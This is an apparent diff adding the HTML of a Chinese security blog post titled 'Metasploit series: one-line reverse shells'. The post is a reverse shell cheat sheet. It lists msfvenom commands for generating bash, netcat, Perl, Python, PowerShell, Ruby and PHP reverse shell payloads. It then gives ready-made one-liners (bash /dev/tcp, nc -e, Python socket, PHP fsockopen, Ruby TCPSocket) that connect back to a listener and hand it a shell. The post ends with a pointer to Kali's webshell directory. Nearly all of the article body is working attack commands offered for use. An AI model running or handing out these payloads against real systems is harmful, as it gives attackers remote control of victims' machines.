@@ -1,0 +1,474 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  <title>Metasploit学习系列之一句话反弹shell | 黑客技术学习分享自留地</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+    <meta name="keywords" content="Sh4dow's  Blog">
+  
+  <meta name="description" content="该篇记录如何使用Msfvenom生成各种一句话反弹Shell，同时也是Reverse Shell Cheat Sheet.">
+<meta name="keywords" content="Msfvenom,Reverse shell">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Metasploit学习系列之一句话反弹shell">
+<meta property="og:url" content="https://sakuxa.com/2019/05/28/msf系列之msfvenom02/index.html">
+<meta property="og:site_name" content="黑客技术学习分享自留地">
+<meta property="og:description" content="该篇记录如何使用Msfvenom生成各种一句话反弹Shell，同时也是Reverse Shell Cheat Sheet.">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://sakuxa.com/2019/05/28/msf系列之msfvenom02/QQ截图20190528222322.png">
+<meta property="og:updated_time" content="2019-05-28T15:23:53.043Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Metasploit学习系列之一句话反弹shell">
+<meta name="twitter:description" content="该篇记录如何使用Msfvenom生成各种一句话反弹Shell，同时也是Reverse Shell Cheat Sheet.">
+<meta name="twitter:image" content="https://sakuxa.com/2019/05/28/msf系列之msfvenom02/QQ截图20190528222322.png">
+  
+  
+    <link rel="icon" href="/LimeWire.png">
+  
+  <link href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+  <link rel="stylesheet" href="/css/style.css">
+  <script src="/js/pace.min.js"></script>
+  
+
+  
+  
+
+</head>
+</html>
+<body>
+  <div id="container">
+      <header id="header">
+    <div id="banner"></div>
+    <div id="header-outer">
+        <div id="header-menu" class="header-menu-pos animated">
+            <div class="header-menu-container">
+                <a href="/" class="left">
+                    <span class="site-title">Sh4dow&#39;s Blog</span>
+                </a>
+                <nav id="header-menu-nav" class="right">
+                    
+                    <a href="/">
+                        <i class="fa fa-home"></i>
+                        <span>Home</span>
+                    </a>
+                    
+                    <a href="/archives">
+                        <i class="fa fa-archive"></i>
+                        <span>Archives</span>
+                    </a>
+                    
+                    <a href="/about">
+                        <i class="fa fa-user"></i>
+                        <span>About</span>
+                    </a>
+                    
+                </nav>
+                <a class="mobile-header-menu-button">
+                    <i class="fa fa-bars"></i>
+                </a>
+            </div>
+        </div>
+        <div id="header-row">
+            <div id="logo">
+                <a href="/">
+                    <img src="/images/avatar1.png" alt="logo">
+                </a>
+            </div>
+            <div class="header-info">
+                <div id="header-title">
+                    
+                </div>
+                <div id="header-description">
+                    
+                    <h3>
+                        不能成为自己喜欢的人，至少成为自己认可的黑客。
+                    </h3>
+                    
+                </div>
+            </div>
+            <nav class="header-nav">
+                <div class="social">
+                    
+                        <a title="Home" target="_blank" href="https://sakuxa.com">
+                            <i class="fa fa-home fa-2x"></i></a>
+                    
+                        <a title="Github" target="_blank" href="https://github.com/sh4douu">
+                            <i class="fa fa-github fa-2x"></i></a>
+                    
+                        <a title="Weibo" target="_blank" href="https://sakuxa.com">
+                            <i class="fa fa-weibo fa-2x"></i></a>
+                    
+                        <a title="Twitter" target="_blank" href="https://sakuxa.com">
+                            <i class="fa fa-twitter fa-2x"></i></a>
+                    
+                </div>
+            </nav>
+        </div>
+    </div>
+</header>
+      <div class="outer">
+        <section id="main" class="body-wrap"><article id="post-msf系列之msfvenom02" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="post-title" itemprop="name">
+      Metasploit学习系列之一句话反弹shell
+    </h1>
+    <div class="post-title-bar">
+      <ul>
+          
+              <li>
+                  <i class="fa fa-book"></i>
+                  
+                      <a href="/categories/Metasploit/">Metasploit</a>
+                  
+              </li>
+          
+        <li>
+          <i class="fa fa-calendar"></i>  2019-05-28
+        </li>
+        <li>
+          <i class="fa fa-eye"></i>
+          <span id="busuanzi_value_page_pv"></span>
+        </li>
+      </ul>
+    </div>
+  
+
+          
+      </header>
+    
+    <div class="article-entry post-content" itemprop="articleBody">
+      
+            
+            <blockquote>
+<p>该篇记录如何使用Msfvenom生成各种一句话反弹Shell，同时也是Reverse Shell Cheat Sheet.</p>
+</blockquote>
+<a id="more"></a>
+<h3 id="0x01-Msfvenom"><a href="#0x01-Msfvenom" class="headerlink" title="0x01 Msfvenom"></a>0x01 Msfvenom</h3><p>查看所有反弹shell payload：</p>
+<ul>
+<li><code>msfvenom --list payload | grep cmd</code></li>
+</ul>
+<p><strong>Bash</strong></p>
+<p>生成一句话Reverse shell：</p>
+<ul>
+<li><code>msfvenom -p cmd/unix/reverse_bash  lhost=192.168.1.102 lport=4444</code></li>
+</ul>
+<p>Reverse shell：</p>
+<ul>
+<li><code>0&lt;&amp;214-;exec 214&lt;&gt;/dev/tcp/192.168.1.102/4444;sh &lt;&amp;214 &gt;&amp;214 2&gt;&amp;214</code></li>
+</ul>
+<p><img src="/2019/05/28/msf系列之msfvenom02/QQ截图20190528222322.png" alt></p>
+<p><strong>Netcat shell</strong></p>
+<p>生成一句话Reverse shell：</p>
+<ul>
+<li><p><code>msfvenom -p cmd/unix/reverse_netcat  lhost=192.168.1.102 lport=4444</code></p>
+<blockquote>
+<ul>
+<li>Reverse shell：<code>mkfifo /tmp/npkto; nc 192.168.1.102 4444 0&lt;/tmp/npkto | /bin/sh &gt;/tmp/npkto 2&gt;&amp;1; rm /tmp/npkto</code></li>
+</ul>
+</blockquote>
+</li>
+</ul>
+<p><strong>Perl</strong></p>
+<ul>
+<li><code>msfvenom -p cmd/unix/reverse_perl  lhost=192.168.1.102 lport=4444</code></li>
+</ul>
+<p><strong>Python</strong></p>
+<ul>
+<li><code>msfvenom -p cmd/unix/reverse_python  lhost=192.168.1.102 lport=4444</code></li>
+</ul>
+<p><strong>Powershell</strong></p>
+<ul>
+<li><code>msfvenom -p cmd/windows/reverse_powershell   lhost=192.168.1.102 lport=4444</code></li>
+</ul>
+<p><strong>Ruby</strong></p>
+<ul>
+<li><code>msfvenom -p cmd/windows/reverse_ruby   lhost=192.168.1.102 lport=4444</code></li>
+</ul>
+<p><strong>PHP</strong></p>
+<ul>
+<li><code>msfvenom -p cmd/unix/reverse_php_ssl   lhost=192.168.1.102 lport=4444</code></li>
+</ul>
+<h3 id="0x02-Reverse-Shell-Cheat-Sheet"><a href="#0x02-Reverse-Shell-Cheat-Sheet" class="headerlink" title="0x02 Reverse Shell Cheat Sheet"></a>0x02 Reverse Shell Cheat Sheet</h3><p><strong>Bash</strong></p>
+<ul>
+<li><code>bash -i &gt;&amp; /dev/tcp/192.168.0.5/4444 0&gt;&amp;1</code></li>
+</ul>
+<p><strong>Netcat</strong></p>
+<ul>
+<li><code>nc -e /bin/sh 192.168.0.5 4444</code></li>
+</ul>
+<p><strong>Python</strong></p>
+<ul>
+<li><code>python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.0.5&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</code></li>
+</ul>
+<p><strong>PHP</strong></p>
+<ul>
+<li><code>php -r &#39;$sock=fsockopen(&quot;192.168.0.5&quot;,4444);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></li>
+</ul>
+<p><strong>Ruby</strong></p>
+<ul>
+<li><code>ruby -rsocket -e&#39;f=TCPSocket.open(&quot;192.168.0.5&quot;,4444).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39;</code></li>
+</ul>
+<p><strong>参考链接：</strong></p>
+<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md</a></p>
+<h3 id="0x03-附-Kali-WebShell"><a href="#0x03-附-Kali-WebShell" class="headerlink" title="0x03 附,Kali WebShell"></a>0x03 附,Kali WebShell</h3><ul>
+<li><code>/usr/share/webshells/</code></li>
+</ul>
+
+            <div class="post-copyright">
+    <div class="content">
+        <p>最后更新： 2019年05月28日 23:23</p>
+        <p>原始链接： <a class="post-url" href="/2019/05/28/msf系列之msfvenom02/" title="Metasploit学习系列之一句话反弹shell">https://sakuxa.com/2019/05/28/msf系列之msfvenom02/</a></p>
+        <footer>
+            <a href="https://sakuxa.com">
+                <img src="/images/avatar1.png" alt="sh4douu">
+                sh4douu
+            </a>
+        </footer>
+    </div>
+</div>
+
+      
+        
+            
+
+        
+    </div>
+    <footer class="article-footer">
+        
+        
+<div class="post-share">
+    <a href="javascript:;" id="share-sub" class="post-share-fab">
+        <i class="fa fa-share-alt"></i>
+    </a>
+    <div class="post-share-list" id="share-list">
+        <ul class="share-icons">
+          <li>
+            <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://sakuxa.com/2019/05/28/msf系列之msfvenom02/&title=《Metasploit学习系列之一句话反弹shell》 — 黑客技术学习分享自留地&pic=images/timgmsf.jpg" data-title="微博">
+              <i class="fa fa-weibo"></i>
+            </a>
+          </li>
+          <li>
+            <a class="weixin share-sns" id="wxFab" href="javascript:;" data-title="微信">
+              <i class="fa fa-weixin"></i>
+            </a>
+          </li>
+          <li>
+            <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://sakuxa.com/2019/05/28/msf系列之msfvenom02/&title=《Metasploit学习系列之一句话反弹shell》 — 黑客技术学习分享自留地&source=
+该篇记录如何使用Msfvenom生成各种一句话反弹Shell，同时也是Reverse Shell Cheat Sheet.
+" data-title="QQ">
+              <i class="fa fa-qq"></i>
+            </a>
+          </li>
+          <li>
+            <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://sakuxa.com/2019/05/28/msf系列之msfvenom02/" data-title="Facebook">
+              <i class="fa fa-facebook"></i>
+            </a>
+          </li>
+          <li>
+            <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Metasploit学习系列之一句话反弹shell》 — 黑客技术学习分享自留地&url=https://sakuxa.com/2019/05/28/msf系列之msfvenom02/&via=https://sakuxa.com" data-title="Twitter">
+              <i class="fa fa-twitter"></i>
+            </a>
+          </li>
+          <li>
+            <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://sakuxa.com/2019/05/28/msf系列之msfvenom02/" data-title="Google+">
+              <i class="fa fa-google-plus"></i>
+            </a>
+          </li>
+        </ul>
+     </div>
+</div>
+<div class="post-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;" id="wxShare-close">×</a>
+    <p>扫一扫，分享到微信</p>
+    <img src="//api.qrserver.com/v1/create-qr-code/?data=https://sakuxa.com/2019/05/28/msf系列之msfvenom02/" alt="微信分享二维码">
+</div>
+
+<div class="mask"></div>
+
+        
+        <ul class="article-footer-menu">
+            
+            
+  <li class="article-footer-tags">
+    <i class="fa fa-tags"></i>
+      
+    <a href="/tags/Msfvenom/" class="color4">Msfvenom</a>
+      
+    <a href="/tags/Reverseshell/" class="color4">Reverse shell</a>
+      
+  </li>
+
+        </ul>
+        
+    </footer>
+  </div>
+</article>
+
+
+    <aside class="post-toc-pos post-toc-top" id="post-toc">
+        <nav class="post-toc-wrap">
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#0x01-Msfvenom"><span class="post-toc-text">0x01 Msfvenom</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#0x02-Reverse-Shell-Cheat-Sheet"><span class="post-toc-text">0x02 Reverse Shell Cheat Sheet</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#0x03-附-Kali-WebShell"><span class="post-toc-text">0x03 附,Kali WebShell</span></a></li></ol>
+        </nav>
+    </aside>
+    
+
+<nav id="article-nav">
+  
+  
+    <a href="/2019/05/26/msf系列之msfvenom/" id="article-nav-older" class="article-nav-link-wrap">
+      <span class="article-nav-title">Metasploit学习系列之msfvenom生成payload</span>
+      <i class="fa fa-hand-o-right" aria-hidden="true"></i>
+    </a>
+  
+</nav>
+
+
+
+    
+</section>
+        
+      </div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+<p>
+    <span id="busuanzi_container_site_uv" style="display:none">
+        总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style="display:none">
+        总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+      <p>
+        Powered by  <a href="http://hexo.io/" target="_blank">Hexo</a>
+        Theme <a href="//github.com/wongminho/hexo-theme-miho" target="_blank">MiHo</a>
+      &copy; 2019 sh4douu<br>
+      </p>
+    </div>
+  </div>
+</footer>
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<script src="//cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script>
+<script>
+  var mihoConfig = {
+      root: "https://sakuxa.com",
+      animate: true,
+      isHome: false,
+      share: true,
+      reward: 0
+  }
+</script>
+<div class="sidebar">
+    <div id="sidebar-search" title="Search">
+        <i class="fa fa-search"></i>
+    </div>
+    <div id="sidebar-category" title="Categories">
+        <i class="fa fa-book"></i>
+    </div>
+    <div id="sidebar-tag" title="Tags">
+        <i class="fa fa-tags"></i>
+    </div>
+    <div id="sidebar-top">
+        <span class="sidebar-top-icon"><i class="fa fa-angle-up"></i></span>
+    </div>
+</div>
+<div class="sidebar-menu-box" id="sidebar-menu-box">
+    <div class="sidebar-menu-box-container">
+        <div id="sidebar-menu-box-categories">
+            <a class="category-link" href="/categories/Metasploit/">Metasploit</a><a class="category-link" href="/categories/Misc/">Misc</a><a class="category-link" href="/categories/Pikachu/">Pikachu</a><a class="category-link" href="/categories/Python/">Python</a><a class="category-link" href="/categories/Vulnhub/">Vulnhub</a><a class="category-link" href="/categories/WEB漏洞学习/">WEB漏洞学习</a><a class="category-link" href="/categories/Win32/">Win32</a><a class="category-link" href="/categories/内网渗透/">内网渗透</a><a class="category-link" href="/categories/无线渗透/">无线渗透</a><a class="category-link" href="/categories/漏洞复现/">漏洞复现</a><a class="category-link" href="/categories/语言/">语言</a>
+        </div>
+        <div id="sidebar-menu-box-tags">
+            <a href="/tags/802-11/" style="font-size: 10px;">802.11</a> <a href="/tags/CSRF/" style="font-size: 10px;">CSRF</a> <a href="/tags/CTF/" style="font-size: 10px;">CTF</a> <a href="/tags/Getshell/" style="font-size: 10px;">Getshell</a> <a href="/tags/HTML文档解析/" style="font-size: 10px;">HTML文档解析</a> <a href="/tags/Kerberos/" style="font-size: 10px;">Kerberos</a> <a href="/tags/Language/" style="font-size: 20px;">Language</a> <a href="/tags/Linux/" style="font-size: 10px;">Linux</a> <a href="/tags/Mimikatz/" style="font-size: 10px;">Mimikatz</a> <a href="/tags/Msfvenom/" style="font-size: 11.67px;">Msfvenom</a> <a href="/tags/My-Ubuntu/" style="font-size: 10px;">My Ubuntu</a> <a href="/tags/MySQL/" style="font-size: 10px;">MySQL</a> <a href="/tags/NTLM/" style="font-size: 10px;">NTLM</a> <a href="/tags/NetBIOS/" style="font-size: 10px;">NetBIOS</a> <a href="/tags/OWASP-Top10-2017/" style="font-size: 10px;">OWASP Top10 2017</a> <a href="/tags/PHP/" style="font-size: 10px;">PHP</a> <a href="/tags/PHPCMSv9/" style="font-size: 10px;">PHPCMSv9</a> <a href="/tags/Pass-The-Hash/" style="font-size: 10px;">Pass The Hash</a> <a href="/tags/Payload/" style="font-size: 10px;">Payload</a> <a href="/tags/Python基础/" style="font-size: 18.33px;">Python基础</a> <a href="/tags/Python模块/" style="font-size: 13.33px;">Python模块</a> <a href="/tags/Re/" style="font-size: 10px;">Re</a> <a href="/tags/Reverse-shell/" style="font-size: 10px;">Reverse shell</a> <a href="/tags/SMB/" style="font-size: 10px;">SMB</a> <a href="/tags/SQL注入/" style="font-size: 10px;">SQL注入</a> <a href="/tags/Ubuntu-2-Mac/" style="font-size: 10px;">Ubuntu 2 Mac</a> <a href="/tags/WEB安全/" style="font-size: 13.33px;">WEB安全</a> <a href="/tags/WLAN/" style="font-size: 10px;">WLAN</a> <a href="/tags/Win32/" style="font-size: 16.67px;">Win32</a> <a href="/tags/Winodows/" style="font-size: 10px;">Winodows</a> <a href="/tags/XML/" style="font-size: 10px;">XML</a> <a href="/tags/XML注入/" style="font-size: 10px;">XML注入</a> <a href="/tags/XSS/" style="font-size: 15px;">XSS</a> <a href="/tags/XXE/" style="font-size: 11.67px;">XXE</a> <a href="/tags/base64/" style="font-size: 10px;">base64</a> <a href="/tags/subprocess/" style="font-size: 10px;">subprocess</a> <a href="/tags/任意文件下载/" style="font-size: 10px;">任意文件下载</a> <a href="/tags/干货/" style="font-size: 10px;">干货</a> <a href="/tags/必会技能/" style="font-size: 10px;">必会技能</a> <a href="/tags/技术/" style="font-size: 10px;">技术</a> <a href="/tags/收集/" style="font-size: 10px;">收集</a> <a href="/tags/文件上传/" style="font-size: 10px;">文件上传</a> <a href="/tags/文件包含/" style="font-size: 10px;">文件包含</a> <a href="/tags/文件描述符/" style="font-size: 10px;">文件描述符</a> <a href="/tags/文件权限/" style="font-size: 10px;">文件权限</a> <a href="/tags/无线渗透/" style="font-size: 10px;">无线渗透</a> <a href="/tags/暴力破解/" style="font-size: 10px;">暴力破解</a> <a href="/tags/权限提升/" style="font-size: 10px;">权限提升</a> <a href="/tags/汇编语言/" style="font-size: 16.67px;">汇编语言</a> <a href="/tags/环境搭建/" style="font-size: 10px;">环境搭建</a> <a href="/tags/管道/" style="font-size: 10px;">管道</a> <a href="/tags/编码与解码/" style="font-size: 10px;">编码与解码</a> <a href="/tags/跨站请求伪造/" style="font-size: 10px;">跨站请求伪造</a> <a href="/tags/过滤与绕过/" style="font-size: 10px;">过滤与绕过</a> <a href="/tags/重定向/" style="font-size: 10px;">重定向</a> <a href="/tags/靶场/" style="font-size: 15px;">靶场</a> <a href="/tags/靶机/" style="font-size: 10px;">靶机</a>
+        </div>
+    </div>
+    <a href="javascript:;" class="sidebar-menu-box-close">&times;</a>
+</div>
+<div class="mobile-header-menu-nav" id="mobile-header-menu-nav">
+    <div class="mobile-header-menu-container">
+        <span class="title">Menus</span>
+        <ul class="mobile-header-menu-navbar">
+            
+            <li>
+                <a href="/">
+                    <i class="fa fa-home"></i><span>Home</span>
+                </a>
+            </li>
+            
+            <li>
+                <a href="/archives">
+                    <i class="fa fa-archive"></i><span>Archives</span>
+                </a>
+            </li>
+            
+            <li>
+                <a href="/about">
+                    <i class="fa fa-user"></i><span>About</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    <div class="mobile-header-tag-container">
+        <span class="title">Tags</span>
+        <div id="mobile-header-container-tags">
+            <a href="/tags/802-11/" style="font-size: 10px;">802.11</a> <a href="/tags/CSRF/" style="font-size: 10px;">CSRF</a> <a href="/tags/CTF/" style="font-size: 10px;">CTF</a> <a href="/tags/Getshell/" style="font-size: 10px;">Getshell</a> <a href="/tags/HTML文档解析/" style="font-size: 10px;">HTML文档解析</a> <a href="/tags/Kerberos/" style="font-size: 10px;">Kerberos</a> <a href="/tags/Language/" style="font-size: 20px;">Language</a> <a href="/tags/Linux/" style="font-size: 10px;">Linux</a> <a href="/tags/Mimikatz/" style="font-size: 10px;">Mimikatz</a> <a href="/tags/Msfvenom/" style="font-size: 11.67px;">Msfvenom</a> <a href="/tags/My-Ubuntu/" style="font-size: 10px;">My Ubuntu</a> <a href="/tags/MySQL/" style="font-size: 10px;">MySQL</a> <a href="/tags/NTLM/" style="font-size: 10px;">NTLM</a> <a href="/tags/NetBIOS/" style="font-size: 10px;">NetBIOS</a> <a href="/tags/OWASP-Top10-2017/" style="font-size: 10px;">OWASP Top10 2017</a> <a href="/tags/PHP/" style="font-size: 10px;">PHP</a> <a href="/tags/PHPCMSv9/" style="font-size: 10px;">PHPCMSv9</a> <a href="/tags/Pass-The-Hash/" style="font-size: 10px;">Pass The Hash</a> <a href="/tags/Payload/" style="font-size: 10px;">Payload</a> <a href="/tags/Python基础/" style="font-size: 18.33px;">Python基础</a> <a href="/tags/Python模块/" style="font-size: 13.33px;">Python模块</a> <a href="/tags/Re/" style="font-size: 10px;">Re</a> <a href="/tags/Reverse-shell/" style="font-size: 10px;">Reverse shell</a> <a href="/tags/SMB/" style="font-size: 10px;">SMB</a> <a href="/tags/SQL注入/" style="font-size: 10px;">SQL注入</a> <a href="/tags/Ubuntu-2-Mac/" style="font-size: 10px;">Ubuntu 2 Mac</a> <a href="/tags/WEB安全/" style="font-size: 13.33px;">WEB安全</a> <a href="/tags/WLAN/" style="font-size: 10px;">WLAN</a> <a href="/tags/Win32/" style="font-size: 16.67px;">Win32</a> <a href="/tags/Winodows/" style="font-size: 10px;">Winodows</a> <a href="/tags/XML/" style="font-size: 10px;">XML</a> <a href="/tags/XML注入/" style="font-size: 10px;">XML注入</a> <a href="/tags/XSS/" style="font-size: 15px;">XSS</a> <a href="/tags/XXE/" style="font-size: 11.67px;">XXE</a> <a href="/tags/base64/" style="font-size: 10px;">base64</a> <a href="/tags/subprocess/" style="font-size: 10px;">subprocess</a> <a href="/tags/任意文件下载/" style="font-size: 10px;">任意文件下载</a> <a href="/tags/干货/" style="font-size: 10px;">干货</a> <a href="/tags/必会技能/" style="font-size: 10px;">必会技能</a> <a href="/tags/技术/" style="font-size: 10px;">技术</a> <a href="/tags/收集/" style="font-size: 10px;">收集</a> <a href="/tags/文件上传/" style="font-size: 10px;">文件上传</a> <a href="/tags/文件包含/" style="font-size: 10px;">文件包含</a> <a href="/tags/文件描述符/" style="font-size: 10px;">文件描述符</a> <a href="/tags/文件权限/" style="font-size: 10px;">文件权限</a> <a href="/tags/无线渗透/" style="font-size: 10px;">无线渗透</a> <a href="/tags/暴力破解/" style="font-size: 10px;">暴力破解</a> <a href="/tags/权限提升/" style="font-size: 10px;">权限提升</a> <a href="/tags/汇编语言/" style="font-size: 16.67px;">汇编语言</a> <a href="/tags/环境搭建/" style="font-size: 10px;">环境搭建</a> <a href="/tags/管道/" style="font-size: 10px;">管道</a> <a href="/tags/编码与解码/" style="font-size: 10px;">编码与解码</a> <a href="/tags/跨站请求伪造/" style="font-size: 10px;">跨站请求伪造</a> <a href="/tags/过滤与绕过/" style="font-size: 10px;">过滤与绕过</a> <a href="/tags/重定向/" style="font-size: 10px;">重定向</a> <a href="/tags/靶场/" style="font-size: 15px;">靶场</a> <a href="/tags/靶机/" style="font-size: 10px;">靶机</a>
+        </div>
+    </div>
+</div>
+<div class="search-wrap">
+    <span class="search-close">&times;</span>
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+            <i class="icon icon-lg icon-chevron-left"></i>
+        </a>
+        <input class="search-field" placeholder="Search..." id="keywords">
+        <a id="search-submit" href="javascript:;">
+            <i class="fa fa-search"></i>
+        </a>
+    <div class="search-container" id="search-container">
+        <ul class="search-result" id="search-result">
+        </ul>
+    </div>
+</div>
+
+<div id="search-tpl">
+    <li class="search-result-item">
+        <a href="{url}" class="search-item-li">
+            <span class="search-item-li-title" title="{title}">{title}</span>
+        </a>
+    </li>
+</div>
+<script src="/js/search.js"></script>
+<script src="/js/main.js"></script>
+
+
+  <script src="//cdn.bootcss.com/particles.js/2.0.0/particles.min.js"></script>
+  <div id="particles"></div>
+  <script src="/js/particles.js"></script>
+
+
+
+
+
+
+
+  <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+  <script src="//cdn.bootcss.com/scrollReveal.js/3.0.5/scrollreveal.js"></script>
+  <script src="/js/animate.js"></script>
+
+
+  <script src="/js/pop-img.js"></script>
+  <script>
+     $(".article-entry p img").popImg();
+  </script>
+
+  </div>
+</body>
+</html>
